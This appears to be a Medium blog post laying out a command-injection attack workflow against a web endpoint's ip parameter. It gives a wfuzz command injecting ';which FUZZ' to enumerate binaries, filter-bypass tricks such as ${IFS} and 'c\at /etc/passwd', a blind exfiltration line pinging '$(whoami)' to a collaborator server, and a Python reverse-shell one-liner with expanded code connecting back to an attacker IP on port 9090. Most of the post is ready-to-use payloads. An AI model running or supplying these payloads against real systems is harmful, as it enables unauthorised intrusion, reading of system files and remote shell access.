# :game_die: Medium

---

## Exploit (build payload)

- **Check for existing tools using the payload below:**

```
fuffsec #baseline
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat
ss
ifconfig
ip
hostname
php
python
python3
perl
java
awk
sed
grep
cat
more
less
tail
head
find
ssh
telnet
bash
sh
zsh
dig
nslookup
traceroute
dd
ncat
nmap
ftp
tftp
base64
gzip
gunzip
tar
zip
unzip
```

```
wfuzz -c -z file,payload.txt --hc 404 "http:<end_point>?ip=127.0.0.1;which FUZZ"
```

- Filter based on response size

**2. Bypass restrictions**

Types of restrictions:

>

Use encoding to bypass restrictions, if does not work then use the below
- base64
- hexadecimal
- octal
- Use double quotes and single quotes

*2.1 blacklist bypass*

2.1.1 Space bypass

```
<>
<
>
$IFS\
${IFS}
```

2.1.2 keyword bypass

In the context of shell scripting, `$*` and `$@` are used to refer to all the arguments passed to a script. If a script is mistakenly interpolating these within a command, an attacker can inject additional commands.

```
# A simplistic script
echo "Printing argument: $@"
```

These are ways to reference positional parameters in a shell script. `$x` where `x` is a number between 1-9, referring to the respective argument passed to the script. `${x}`, where `x` is 10 or greater, is another way to refer to positional parameters beyond single digits.

Backslashes can be used to escape characters, making the subsequent character be interpreted literally. This can sometimes be used to bypass filters.

Example: If a filter is blocking the `cat` command, an attacker might try `c\at /etc/passwd` to potentially bypass the filter.

Variables can sometimes be set to particular values and then referenced to execute commands.

## Get @fuffsec’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

*2.2 Blind injection bypass*

Here, we can it bypass cause we are unaware that something is happening. So, we need to use the ‘sleep’ or ‘ping’ command to find it.

```
ping $(whoami).collaborator_server_dot_com
```

blog: <link>, <link>

*2.3 Misc*

For more bypass techniques, follow this: <[link](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)>

**3. Get a reverse shell**

given below are the few payloads we could use (please encode it and bypass restrictions) :

Since we enumerated the existing tools in Step 1, we know what to do.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Actual code:

```
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);'
```

>

I would suggest you use the website to generate an awesome payload. <[link](https://www.revshells.com/)>

---
